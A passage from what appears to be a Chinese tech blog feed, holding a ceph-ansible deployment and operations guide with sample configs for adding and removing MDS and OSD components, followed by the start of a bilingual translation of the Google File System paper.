align="center">2.10</td></tr></tbody></table><h2 id="1-2、目录结构"><a href="#1-2、目录结构" class="headerlink" title="1.2、目录结构"></a>1.2、目录结构</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">.<br>├── contrib<br>├── docs<br>├── group_vars<br>├── infrastructure-playbooks<br>├── library<br>├── module_utils<br>├── plugins<br>├── profiles<br>├── roles<br>├── tests<br>├── requirements.txt<br>├── requirements.yml<br>├── site-container.yml.sample<br>├── site.yml.sample<br></code></pre></td></tr></table></figure><ul><li><code>docs</code> : <a href="https://docs.ceph.com/projects/ceph-ansible/en/stable-6.0/">ceph-ansible doc</a> 的原始文档，用于展示不同分支版本的文档资料；</li><li><code>group_vars</code> : 定义 Ceph 不同组件（mon，osd等）的一些初始配置，在部署集群时会修改其中的配置进行自定义的集群部署；</li><li><code>infrastructure-playbooks</code> : Ceph 相关的 ansible 的 playbooks ，主要用于管控操作 Ceph 集群；</li><li><code>library</code> : Ceph 相关的自定义 ansible 模块，用于完成 Ceph 相关的一些操作；</li><li><code>roles</code> : Ceph 相关的自定义 ansible 任务，后续会通过 include_role 和 import_role 的方式引入并执行这些任务；</li><li><code>tests</code> : 测试代码；</li></ul><h2 id="1-3、自定义模块"><a href="#1-3、自定义模块" class="headerlink" title="1.3、自定义模块"></a>1.3、自定义模块</h2><p>ceph-ansible 为了更好的编写部署、管控的 playbooks ，引入了很多自定义的模块，用于更好的操作 ceph 集群。这些自定义模块均位于 .&#x2F;library 目录。</p><ul><li><code>ceph_add_user_buckets.py</code> : 创建 bucket 和 user 对象，调用 boto 和 radosgw 相关库的实现；</li><li><code>ceph_crush_rule.py</code> : 依据不同的 state 执行不同的操作。present 表示新增 crush rule ， absent 表示移除 crush rule ， info 表示查看 crush rule 信息；</li><li><code>ceph_crush.py</code> : 获取 crush map 并排列 item 节点信息；</li><li><code>ceph_dashboard_user.py</code> : 依据不同的 state 执行不同的操作。present 表示新增加 dashboard 的用户并设置角色&#x2F;密码等 ， absent 表示移除 dashboard 的用户 ， info 表示查看 dashboard 的用户信息；</li><li><code>ceph_ec_profile.py</code> : 依据不同的 state 执行不同的操作。present 表示设置纠删码配置，absent 表示删除纠删码配置；</li><li><code>ceph_fs.py</code> : 依据不同的 state 执行不同的操作。present 表示设置文件系统配置，absent 表示删除文件系统配置，info 表示查看文件系统配置；</li><li><code>ceph_key.py</code> : 依据不同的 state 执行不同的操作。present&#x2F;update 表示设置密钥信息，absent 表示删除密钥信息，info 表示查看密钥信息，list 表示遍历所有密钥信息， fetch_initial_keys 表示获取特定密钥信息，generate_secret 表示生成密钥内容；</li><li><code>ceph_mgr_module.py</code> : </li><li><code>ceph_osd_flag.py</code> : 依据不同的 state 执行不同的操作。present 表示设置 osd flag ， absent 表示重置 osd flag ；</li><li><code>ceph_osd.py</code> : 依据不同的 state 执行不同的操作。destroy 表示销毁 osd 且单次只能操作一个，down 表示下线 osd ，in 表示接入 osd ，out 表示移除 osd ，purge 表示清除 osd 且单次只能操作一个 ，rm 表示删除 osd ；</li><li><code>ceph_pool.py</code> : 操作 pool 相关；</li><li><code>ceph_volumn_simple_activate.py</code> : </li><li><code>ceph_volumn_simple_scan.py</code> : </li><li><code>ceph_volumn.py</code> : </li><li><code>cephadm_adopt.py</code> : 采用具有 cephadm 的 ceph 集群；</li><li><code>cephadm_bootstrap.py</code> : 通过 cephadm 引导 ceph 集群；</li><li><code>igw_client.py</code> : 管理 iscsi 网关客户端定义；</li><li><code>igw_gateway.py</code> : 管理 iscsi 网关定义；</li><li><code>igw_lun.py</code> : 管理 ceph-rbd 映像以作为 iscsi lun 呈现给客户端；</li><li><code>igw_purge.py</code> : 提供清除功能以删除 iscsi 网关；</li><li><code>radosgw_caps.py</code> : 管理 RADOS 网关管理功能；</li><li><code>radosgw_realm.py</code> : 管理 RADOS 网关领域；</li><li><code>radosgw_user.py</code> : 管理 RADOS 网关用户；</li><li><code>radosgw_zone.py</code> : 管理 RADOS 网关区域；</li><li><code>radosgw_zonegroup.py</code> : 管理 RADOS 网关区域组；</li></ul><h2 id="1-4、自定义任务"><a href="#1-4、自定义任务" class="headerlink" title="1.4、自定义任务"></a>1.4、自定义任务</h2><p>ceph-ansible 内部抽象了一些任务列表，目录位于：.&#x2F;roles。</p><ul><li><code>ceph-client</code> : 创建分发用户密钥；</li><li><code>ceph-common</code> : 配置 ceph 的安装仓库，配置内存分配器等；</li><li><code>ceph-config</code> : 创建 ceph 的数据目录，生成集群配置文件等；</li><li><code>ceph-container-common</code> : 拉取 ceph 相关的容器镜像；</li><li><code>ceph-container-engine</code> : 初始化容器引擎的基础信息（仓库地址等）；</li><li><code>ceph-crash</code> : 创建 ceph-crash 的 systemd 单元文件，启动 ceph-crash服务；</li><li><code>ceph-dashboard</code> : 调整 dashboard 的配置；</li><li><code>ceph-defaults</code> : 包含 ceph 所有组件的基础的默认配置；</li><li><code>ceph-facts</code> : 获取集群设备信息，获取集群 crush 信息，设置 grafana&#x2F;radosgw 地址信息等；</li><li><code>ceph-fetch-keys</code> : 复制 ceph 和 bootstrap 的密钥到本地的指定目录；</li><li><code>ceph-grafana</code> : 变更 grafana 相关配置，启动 grafana 服务；</li><li><code>ceph-handler</code> : 包含的 handlers 的程序，主要涉及到对 ceph 相关的进程进行一些重启操作：</li><li><code>ceph-infra</code> : 修改一些防火墙，时间同步等的配置；</li><li><code>ceph-iscsi-gw</code> : 配置 iscsi-gw 相关服务；</li><li><code>ceph-mds</code> : 配置并启动 mds 服务；</li><li><code>ceph-mgr</code> : 配置并启动 mgr 服务；</li><li><code>ceph-mon</code> : 配置并启动 mon 服务；</li><li><code>ceph-nfs</code> : 配置并启动 nfs 服务；</li><li><code>ceph-node-exporter</code> : 配置并启动 node-exporter 服务；</li><li><code>ceph-osd</code> : 配置并启动 osd 服务；</li><li><code>ceph-prometheus</code> : 配置并启动 prometheus 服务；</li><li><code>ceph-rbd-mirror</code> : 配置并启动 rbd-mirror 服务；</li><li><code>ceph-rgw</code> : 配置并启动 rgw 服务；</li><li><code>ceph-rgw-loadbalancer</code> : 配置并启动 mgr-loadbalancer 服务；</li><li><code>ceph-validate</code> : 部署 ceph 之前验证各种环境的配置是否正常；</li></ul><h1 id="二、集群部署"><a href="#二、集群部署" class="headerlink" title="二、集群部署"></a>二、集群部署</h1><p><strong>建议使用如下的 python&#x2F;ansible 环境运行 ceph-ansible ：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># stable-6.0</span><br>pyenv install 3.8.16<br>pip install ansible==2.10.7<br><br><span class="hljs-comment"># stable-7.0</span><br>pyenv install 3.10.14<br>pip install ansible==8.7.0<br><br><span class="hljs-comment"># stable-8.0</span><br>pyenv install 3.10.14<br>pip install ansible==9.8.0<br><br><span class="hljs-comment"># stable-9.0</span><br>pyenv install 3.10.14<br>pip install ansible==9.8.0<br></code></pre></td></tr></table></figure><p><strong>下载 ceph-ansible 并安装依赖：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ceph/ceph-ansible.git<br>git checkout <span class="hljs-variable">$branch</span><br>pip install -r requirements.txt<br>ansible-galaxy install -r requirements.yml<br></code></pre></td></tr></table></figure><p><strong>相关操作命令：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 探测节点</span><br>ansible -i hosts.ini -m ping all<br><br><span class="hljs-comment"># 采集节点信息</span><br>ansible -i hosts.ini -m setup all<br><br><span class="hljs-comment"># 部署集群</span><br>ansible-playbook -vvvv -i hosts.ini site.yml<br><br><span class="hljs-comment"># 销毁集群</span><br>ansible-playbook -vvvv -i hosts.ini infrastructure-playbooks/purge-cluster.yml<br><br><span class="hljs-comment"># 变更 mds</span><br>ansible-playbook -vvvv -i hosts.ini site.yml --<span class="hljs-built_in">limit</span> mdss<br><br><span class="hljs-comment"># 变更 osd</span><br>ansible-playbook -vvvv -i hosts.ini site.yml --<span class="hljs-built_in">limit</span> osds<br><br><span class="hljs-comment"># 清理异常的 lvm </span><br><span class="hljs-built_in">sudo</span> dmsetup <span class="hljs-built_in">ls</span><br><span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>    oline=<span class="hljs-variable">$line</span><br>    nline=<span class="hljs-variable">$&#123;line%-osd--block-*&#125;</span><br>    <span class="hljs-built_in">sudo</span> dmsetup remove <span class="hljs-variable">$oline</span><br>    <span class="hljs-built_in">sudo</span> lvremove /dev/mapper/<span class="hljs-variable">$oline</span><br>    <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> -rf /dev/<span class="hljs-variable">$nline</span><br><span class="hljs-keyword">done</span> &lt; &lt;(<span class="hljs-built_in">sudo</span> dmsetup <span class="hljs-built_in">ls</span> | grep <span class="hljs-string">&quot;ceph--&quot;</span> | awk -F <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br><br><span class="hljs-comment"># 查看 crush map</span><br>ceph osd getcrushmap -o crushmap.file<br>crushtool -d crushmap.file -o crushmap-human.file<br><span class="hljs-built_in">cat</span> crushmap-human.file<br></code></pre></td></tr></table></figure><h1 id="三、集群运维"><a href="#三、集群运维" class="headerlink" title="三、集群运维"></a>三、集群运维</h1><p>以下运维脚本基于 stable-6.0 分支代码。</p><h2 id="3-1、移除-MDS-组件"><a href="#3-1、移除-MDS-组件" class="headerlink" title="3.1、移除 MDS 组件"></a>3.1、移除 MDS 组件</h2><p>ceph-ansible 提供了移除 mds 的相关脚本，但是对于 cephfs 相关 pool 的删除仍需手动操作。详细操作步骤如下。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 确保 hosts.ini 配置文件与集群最新的配置文件一致</span><br>vi hosts.ini<br><br><span class="hljs-comment"># 验证集群节点连通性，必要时需要将当前控制节点的公钥传输给对应节点</span><br>ansible -i hosts.ini -m ping all<br><br><span class="hljs-comment"># 移除 MDS 组件（最后移除 active 状态的 MDS）</span><br>ansible-playbook infrastructure-playbooks/shrink-mds.yml -vvvv -i hosts.ini -e mds_to_kill=ceph02<br>ansible-playbook infrastructure-playbooks/shrink-mds.yml -vvvv -i hosts.ini -e mds_to_kill=ceph01<br><br><span class="hljs-comment"># 查看集群状态</span><br>ceph fs status<br>ceph osd pool <span class="hljs-built_in">ls</span> detail<br><br><span class="hljs-comment"># 移除 CephFS 相关 Pool</span><br>ceph tell mon.\* injectargs <span class="hljs-string">&#x27;--mon-allow-pool-delete=true&#x27;</span><br>ceph osd pool delete cephfs_metadata cephfs_metadata --yes-i-really-really-mean-it<br>ceph osd pool delete cephfs_data cephfs_data --yes-i-really-really-mean-it<br>ceph tell mon.\* injectargs <span class="hljs-string">&#x27;--mon-allow-pool-delete=false&#x27;</span><br><br><span class="hljs-comment"># 修改 hosts.ini 文件，移除 mdss 配置</span><br>vi hosts.ini<br><br><span class="hljs-comment"># 查看集群状态</span><br>ceph fs status<br>ceph osd pool <span class="hljs-built_in">ls</span> detail<br></code></pre></td></tr></table></figure><h2 id="3-2、新增-MDS-组件"><a href="#3-2、新增-MDS-组件" class="headerlink" title="3.2、新增 MDS 组件"></a>3.2、新增 MDS 组件</h2><p>该步骤新增 MDS 的操作是基于新增 OSD 组件之后的进行的操作，所以步骤较为繁琐，如果是在没有新增 OSD 组件的情况下，且是在现有机器节点中新增 MDS 组件，则不需要修改对应的 host_vars 目录中文件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 确保 hosts.ini 配置文件与集群最新的配置文件一致，并新增 mdss 配置</span><br>vi hosts.ini<br><br><span class="hljs-comment"># 修改 cephfs 的配置 ，主要是 meta pool 和 data pool 的配置， 以及其他的配置（内存大小，trim cache 的时间控制配置等）</span><br>vi group_vars/all.yml<br><br><span class="hljs-comment"># 新增 MDS 组件的节点信息</span><br><span class="hljs-built_in">ls</span> -al host_vars/<br>vi host_vars/ceph04.yml<br>vi host_vars/ceph05.yml<br>vi host_vars/ceph06.yml<br><br><span class="hljs-comment"># 更新当前控制节点的 hosts 文件</span><br>vi /etc/hosts<br><br><span class="hljs-comment"># 验证集群节点连通性，必要时需要将当前控制节点的公钥传输给对应节点</span><br>ansible -i hosts.ini -m ping all<br><br><span class="hljs-comment"># 采集机器节点信息，如果在操作时本地没有采集到新增机器节点的信息，可能会导致操作异常</span><br>ansible -i hosts.ini -m setup all<br><br><span class="hljs-comment"># 新增 MDS 组件</span><br>ansible-playbook -vvvv -i hosts.ini site.yml --<span class="hljs-built_in">limit</span> mdss<br><br><span class="hljs-comment"># 查看集群状态</span><br>ceph fs status<br>ceph osd pool <span class="hljs-built_in">ls</span> detail<br></code></pre></td></tr></table></figure><p>新增 MDS 组件的相关示例文件如下：<br><strong>hosts.ini</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[mgrs]<br>ceph01<br>ceph02<br>ceph03<br><br>[mons]<br>ceph01<br>ceph02<br>ceph03<br><br>[mdss]<br>ceph04<br>ceph05<br>ceph06<br><br>[clients]<br>ceph01<br>ceph02<br>ceph03<br>ceph04<br>ceph05<br>ceph06<br><br>[osds]<br>ceph01<br>ceph02<br>ceph03<br>ceph04<br>ceph05<br>ceph06<br><br>[grafana-server]<br>ceph01<br>ceph02<br>ceph03<br>ceph04<br>ceph05<br>ceph06<br></code></pre></td></tr></table></figure><p><strong>group_vars&#x2F;all.yml</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cephfs</span><br>cephfs: cephfs<br>cephfs_metadata_pool:<br>  name: cephfs_metadata<br>  pg_num: 256<br>  pgp_num: 256<br>  size: 3<br>  min_size: 1<br>  rule_name: cephfs_rule<br>  pg_autoscale_mode: off<br>cephfs_data_pool:<br>  name: cephfs_data<br>  pg_num: 1024<br>  pgp_num: 1024<br>  size: 2<br>  min_size: 1<br>  rule_name: cephfs_rule<br>  pg_autoscale_mode: off<br><br><span class="hljs-comment"># other</span><br>ceph_conf_overrides:<br>  osd:<br>    osd memory target: 11779558604<br>  mds:<br>    mds cache trim interval: 10<br>    mds cache trim threshold: 262144<br>    mds cache memory <span class="hljs-built_in">limit</span>: 34359738368<br></code></pre></td></tr></table></figure><h2 id="3-3、新增-OSD-组件"><a href="#3-3、新增-OSD-组件" class="headerlink" title="3.3、新增 OSD 组件"></a>3.3、新增 OSD 组件</h2><p>需要注意新增的 OSD 是否会与现有的 OSD 位于同一个 crush rule，如果只是为了扩容现有 rbd&#x2F;cephfs 的存储空间，通常会位于同一个 crush rule；如果新增的 OSD 是为了承接新功能且需要与现有存储隔离开，那可能就需要创建并加入到新的 crush rule 中，为此我们需要修改对应 group_vars 和 host_vars 目录中的相关文件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 备份集群配置</span><br>ceph osd getcrushmap -o crushmap.file<br>crushtool -d crushmap.file -o crushmap-human.file<br>ceph osd crush class <span class="hljs-built_in">ls</span><br>ceph osd crush rule <span class="hljs-built_in">ls</span><br>ceph osd crush tree<br><br><span class="hljs-comment"># 确保 hosts.ini 配置文件与集群最新的配置文件一致，并新增 osds 配置</span><br>vi hosts.ini<br><br><span class="hljs-comment"># 修改文件中关于 osd 对象存储，内存限制等配置</span><br>vi group_vars/all.yml<br><br><span class="hljs-comment"># 注意是否加入现有的 crush rule 中，从而要修改对应的配置</span><br><span class="hljs-comment"># 修改文件中 devices 及 crush rule 等相关配置</span><br>vi group_vars/osds.yml<br><br><span class="hljs-comment"># 新增对应 OSD 组件所在节点的信息</span><br>vi host_vars/ceph04.yml<br>vi host_vars/ceph05.yml<br>vi host_vars/ceph06.yml<br><br><span class="hljs-comment"># 更新当前控制节点的 hosts 文件</span><br>vi /etc/hosts<br><br><span class="hljs-comment"># 验证集群节点连通性，必要时需要将当前控制节点的公钥传输给对应节点</span><br>ansible -i hosts.ini -m ping all<br><br><span class="hljs-comment"># 采集机器节点信息，如果在操作时本地没有采集到新增机器节点的信息，可能会导致操作异常</span><br>ansible -i hosts.ini -m setup all<br><br><span class="hljs-comment"># 新增 OSD 组件</span><br>ansible-playbook -vvvv -i hosts.ini site.yml --<span class="hljs-built_in">limit</span> <span class="hljs-string">&quot;ceph04,ceph05,ceph06&quot;</span><br><br><span class="hljs-comment"># 查看集群状态</span><br>ceph -s<br>ceph osd tree<br>ceph osd crush class <span class="hljs-built_in">ls</span><br>ceph osd crush rule <span class="hljs-built_in">ls</span><br>ceph osd crush tree<br></code></pre></td></tr></table></figure><p>如果是创建新的 crush rule 并新增 OSD 组件的情况下，相关的参考配置及解释如下：</p><ul><li>新增的 crush rule 名称为 cephfs_rule ： 使当前集群新增 cephfs 的功能，并且 cephfs 相关的数据存储在独立的 osd 组件中；</li><li>新增 3 台机器，每台机器上部署 6 块硬盘用于存储 osd 数据；</li></ul><p><strong>hosts.ini</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[mgrs]<br>ceph01<br>ceph02<br>ceph03<br><br>[mons]<br>ceph01<br>ceph02<br>ceph03<br><br>[clients]<br>ceph01<br>ceph02<br>ceph03<br>ceph04<br>ceph05<br>ceph06<br><br>[osds]<br>ceph01<br>ceph02<br>ceph03<br>ceph04<br>ceph05<br>ceph06<br><br>[grafana-server]<br>ceph01<br>ceph02<br>ceph03<br>ceph04<br>ceph05<br>ceph06<br></code></pre></td></tr></table></figure><p><strong>group_vars&#x2F;all.yml</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># osd</span><br>osd_objectstore: bluestore<br>osd_memory_target: 11779558604<br><br><span class="hljs-comment"># other</span><br>ceph_conf_overrides:<br>  osd:<br>    osd memory target: 11779558604<br></code></pre></td></tr></table></figure><p><strong>group_vars&#x2F;osds.yml</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">---<br>dummy:<br>devices:<br>  - /dev/nvme0n1<br>  - /dev/nvme1n1<br>  - /dev/nvme2n1<br>  - /dev/nvme3n1<br>  - /dev/nvme4n1<br>  - /dev/nvme5n1<br><br>create_crush_tree: <span class="hljs-literal">true</span><br>crush_rule_config: <span class="hljs-literal">true</span><br><br>crush_rule_cephfs:<br>  name: cephfs_rule<br>  root: cephfs<br>  <span class="hljs-built_in">type</span>: host<br>  default: <span class="hljs-literal">false</span><br><br>crush_rules:<br>  - <span class="hljs-string">&quot;&#123;&#123; crush_rule_cephfs &#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>host_vars&#x2F;ceph04.yml</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">monitor_interface: bond0<br>radosgw_interface: bond0<br><br>devices:<br>  - /dev/nvme0n1<br>  - /dev/nvme1n1<br>  - /dev/nvme2n1<br>  - /dev/nvme3n1<br>  - /dev/nvme4n1<br>  - /dev/nvme5n1<br><br>osd_crush_location:<br>  root: cephfs<br>  host: ceph04<br></code></pre></td></tr></table></figure><h1 id="四、相关资料"><a href="#四、相关资料" class="headerlink" title="四、相关资料"></a>四、相关资料</h1><ul><li><a href="https://github.com/ceph/ceph-ansible">https://github.com/ceph/ceph-ansible</a></li><li><a href="https://docs.ceph.com/projects/ceph-ansible/en/latest/">https://docs.ceph.com/projects/ceph-ansible/en/latest/</a></li><li><a href="https://docs.ansible.com/ansible/devel/reference_appendices/release_and_maintenance.html">https://docs.ansible.com/ansible/devel/reference_appendices/release_and_maintenance.html</a></li><li><a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/index.html">https://docs.ansible.com/ansible/latest/collections/ansible/builtin/index.html</a></li><li><a href="https://www.cnblogs.com/biglittleant/p/12857484.html">https://www.cnblogs.com/biglittleant/p/12857484.html</a></li><li><a href="https://juejin.cn/post/6844904127785336839">https://juejin.cn/post/6844904127785336839</a></li><li><a href="https://wangchujiang.com/reference/docs/ansible.html">https://wangchujiang.com/reference/docs/ansible.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - The Google File System</title>
      <link href="/2023/01/10/gfs/"/>
      <url>/2023/01/10/gfs/</url>
      
        <content type="html"><![CDATA[<div><p><a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//archive/gfs-sosp2003.pdf">《The Google File System》</a>  是由 Google 公司开发的分布式文件系统，旨在解决存储海量数据的问题。GFS 采用了一些独特的设计，如基于大块的文件存储、多副本存储和自动故障恢复等。GFS 能够支持高并发、高吞吐量的数据访问，并且具有良好的扩展性和可靠性。GFS 的设计思想已经被广泛应用于其他分布式存储系统的开发中，是分布式存储领域的重要里程碑之一。</p></div><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>We have designed and implemented the Google File System, a scalable distributed file system for large distributed data-intensive applications. It provides fault tolerance while running on inexpensive commodity hardware, and it delivers high aggregate performance to a large number of clients.</p><p>我们设计并实现了 Google File System，这是⼀种可扩展的分布式⽂件系统，适⽤于⼤型分布式数据密集型应⽤程序。它支持在廉价的商品硬件上运⾏时提供容错能⼒，并能够为⼤量客户端提供⾼性能的访问。</p><p>While sharing many of the same goals as previous distributed file systems, our design has been driven by observations of our application workloads and technological environment, both current and anticipated, that reflect a marked departure from some earlier file system assumptions. This has led us to reexamine traditional choices and explore radically different design points.</p><p>虽然与以前的分布式文件系统有许多相同的目标，但我们的设计依据于我们应用的工作负载和对技术环境的观察，包括当前以及预期的情况，这反映了与早期文件系统一些假设的明显差异。这也导致我们重新审视了之前的选择，并探索了完全不同的设计点。</p><p>The file system has successfully met our storage needs. It is widely deployed within Google as the storage platform for the generation and processing of data used by our service as well as research and development efforts that require large data sets. The largest cluster to date provides hundreds of terabytes of storage across thousands of disks on over a thousand machines, and it is concurrently accessed by hundreds of clients.</p><p>GFS 已经成功地满足了我们的存储需求。它在 Google 内部被广泛部署，作为我们服务所使用的数据的生成和处理的存储平台，以及用于需要大型数据集的研究和开发工作。迄今为止，最大的 GFS 集群在一千多台机器上的数千个磁盘上提供了数百 TB 的存储，并被数百个客户同时访问。</p><p>In this paper, we present file system interface extensions designed to support distributed applications, discuss many aspects of our design, and report measurements from both micro-benchmarks and real world use.</p><p>在本文中，我们介绍了为支持分布式应用而设计的文件系统接口扩展，讨论了我们设计的许多方面，并给出了小批量的压测数据与在现实场景中的使用表现。</p><h1 id="类别和主题描述符"><a href="#类别和主题描述符" class="headerlink" title="类别和主题描述符"></a>类别和主题描述符</h1><p>D [4]: 3—Distributed file systems</p><p>D [4]: 3—分布式文件系统</p><h1 id="一般术语"><a href="#一般术语" class="headerlink" title="一般术语"></a>一般术语</h1><p>Design, reliability, performance, measurement</p><p>设计、可靠性、性能、测量</p><h1 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h1><p>Fault tolerance, scalability, data storage, clustered storage</p><p>容错、可扩展性、数据存储、集群存储</p><h1 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h1><p>We have designed and implemented the Google File System (GFS) to meet the rapidly growing demands of Google’s data processing needs. GFS shares many of the same goals as previous distributed file systems such as performance, scalability, reliability, and availability. However, its design has been driven by key observations of our application workloads and technological environment, both current and anticipated, that reflect a marked departure from some earlier file system design assumptions. We have reexamined traditional choices and explored radically different points in the design space.</p><p>为了满足 Google 快速增长的数据处理需求，我们设计并实现了 Google File System（GFS）。GFS 与以前的分布式系统有很多相同的目标，比如性能、可扩展性、可靠性和可用性。然而，它的设计来源于我们对应用负载和技术环境的观察和预期，这与以前的文件系统表现出了完全不同的猜想与假设。因此，我们重新考虑了传统的选择，并探索了完全不同的设计。</p><p>First, component failures are the norm rather than the exception. The file system consists of hundreds or even thousands of storage machines built from inexpensive commodity parts and is accessed by a comparable number of client machines. The quantity and quality of the components virtually guarantee that some are not functional at any given time and some will not recover from their current failures. We have seen problems caused by application bugs, operating system bugs, human errors, and the failures of disks, memory, connectors, networking, and power supplies. Therefore, constant monitoring, error detection, fault tolerance, and automatic recovery must be integral to the system.</p><p>第一，组件故障应该是常态而非例外。GFS 的存储节点由成百上千台廉价设备所构建而成，并且给数量众多的客户端提供访问服务。设备的数量和质量决定了几乎在任何时间上都会有部分组件无法正常工作，甚至于部分组件将无法从故障中恢复。我们已经看到了应用程序错误、操作系统错误、人为错误以及硬盘、内存、连接器、网络和电源造成的问题。因此，系统必须具备持续监控、错误检测、容错以及自动恢复的能力。</p><p>Second, files are huge by traditional standards. Multi-GB files are common. Each file typically contains many application objects such as web documents. When we are regularly working with fast growing data sets of many TBs comprising billions of objects, it is unwieldy to manage billions of approximately KB-sized files even when the file system could support it. As a result, design assumptions and parameters such as I&#x2F;O operation and blocksizes have to be revisited.</p><p>第二，文件相比于传统的标准来说更大。数 GB 大小的文件是十分常见的。每个文件通常包含很多应用程序对象，例如 Web 文档等。因为我们的数据集由数十亿个总量 TB 的对象组成，且这个数字还在快速增长，即使操作系统支持管理数十亿个几 KG 大小的文件的，这也是非常不明智的。因此，我们需要重新考虑像 IO 操作和块大小等的设计和参数。</p><p>Third, most files are mutated by appending new data rather than overwriting existing data. Random writes within a file are practically non-existent. Once written, the files are only read, and often only sequentially. A variety of data share these characteristics. Some may constitute large repositories that data analysis programs scan through. Some may be data streams continuously generated by running applications. Some may be archival data. Some may be intermediate results produced on one machine and processed on another, whether simultaneously or later in time. Given this access pattern on huge files, appending becomes the focus of performance optimization and atomicity guarantees, while caching data blocks in the client loses its appeal.</p><p>第三，大多数文件是通过追加的方式进行变更，而不是通过重写已有的数据。在实际的场景中几乎不存在对文件的随机写入。文件一旦被写入，就是只读的，且通常为顺序读取。很多数据都有这样的特征。有些可能是数据分析程序扫描的大型数据集。有些可能是流式程序持续生成的数据。有些可能是归档数据。有些可能是由一台机器生产并同时或稍后在另一台机器上处理的数据等。鉴于这种对大文件的访问模式，追加成为了性能优化和原子性保证的重重点，而客户端中对块数据的缓存则不再重要。</p><p>Fourth, co-designing the applications and the file system API benefits the overall system by increasing our flexibility. For example, we have relaxed GFS’s consistency model to vastly simplify the file system without imposing an onerous burden on the applications. We have also introduced an atomic append operation so that multiple clients can append concurrently to a file without extra synchronization between them. These will be discussed in more details later in the paper.</p><p>第四，共同设计应用程序和文件系统 API 有助于提高整个系统的灵活性。例如，我们放宽了 GFS 的一致性模型，极大的简化了文件系统，减少了应用程序的负担。我们还引入一种原子追加的操作，以便于多个客户端可以同时追加到同一个文件，而无需在他们之间进行额外的同步。这些将在本⽂后⾯进⾏更详细的讨论。</p><p>Multiple GFS clusters are currently deployed for different purposes. The largest ones have over 1000 storage nodes, over 300 TB of diskstorage, and are heavily accessed by hundreds of clients on distinct machines on a continuous basis.</p><p>⽬前部署了多个 GFS 集群⽤于不同的⽬的。其中最大的集群拥有超过 1000 个存储节点，超过 300 TB 的磁盘存储，并被不同机器上的数百个客户端连续不断的大量访问。</p><h1 id="2、设计概述"><a href="#2、设计概述" class="headerlink" title="2、设计概述"></a>2、设计概述</h1><h2 id="2-1、假设"><a href="#2-1、假设" class="headerlink" title="2.1、假设"></a>2.1、假设</h2><p>In designing a file system for our needs, we have been guided by assumptions that offer both challenges and opportunities. We alluded to some key observations earlier and now lay out our assumptions in more details.</p><p>在设计能够满足我们需求的文件系统时，我们遵循着挑战与机遇并存的指导原则。我们之前提到了一些关键的观察结果，现在我们将更详细的阐述我们的假设。</p><ul><li>The system is built from many inexpensive commodity components that often fail. It must constantly monitor itself and detect, tolerate, and recover promptly from component failures on a routine basis.</li><li>The system stores a modest number of large files. We expect a few million files, each typically 100 MB or larger in size. Multi-GB files are the common case and should be managed efficiently. Small files must be supported, but we need not optimize for them.</li><li>The workloads primarily consist of two kinds of reads: large streaming reads and small random reads. In large streaming reads, individual operations typically read hundreds of KBs, more commonly 1 MB or more. Successive operations from the same client often read through a contiguous region of a file. A small random read typically reads a few KBs at some arbitrary offset. Performance-conscious applications often batch and sort their small reads to advance steadily through the file rather than go backand forth.</li><li>The workloads also have many large, sequential writes that append data to files. Typical operation sizes are similar to those for reads. Once written, files are seldom modified again. Small writes at arbitrary positions in a file are supported but do not have to be efficient.</li><li>The system must efficiently implement well-defined semantics for multiple clients that concurrently append to the same file. Our files are often used as producerconsumer queues or for many-way merging. Hundreds of producers, running one per machine, will concurrently append to a file. Atomicity with minimal synchronization overhead is essential. The file may be read later, or a consumer may be reading through the file simultaneously.</li><li>High sustained bandwidth is more important than low latency. Most of our target applications place a premium on processing data in bulkat a high rate, while few have stringent response time requirements for an individual read or write.</li></ul><br /><ul><li>系统由许多可能经常发生故障的廉价的组件构成。它必须不断地自我检测、定期检测、容错组件故障并能够迅速的进行恢复。</li><li>系统存储一定数量的大文件。 我们期望能够存储几百万个大小为 100MB 甚至更大的文件。系统中经常有一些 GB 级别的问题，且这些文件需要被高效的进行管理。系统同样也必须支持小文件，但我们不需要为它们进行优化。</li><li>工作负载主要由两种读组成：大规模的流式读取和小规模的随机读取。 在大规模的流式读取中，每次读取通常会读取数百 KB，1MB 甚至于更多。来自同一个客户端的连续操作通常会读取文件的一个连续区域。 小规模的随机读取通常会在文件的某个任意偏移处读取几 KB。 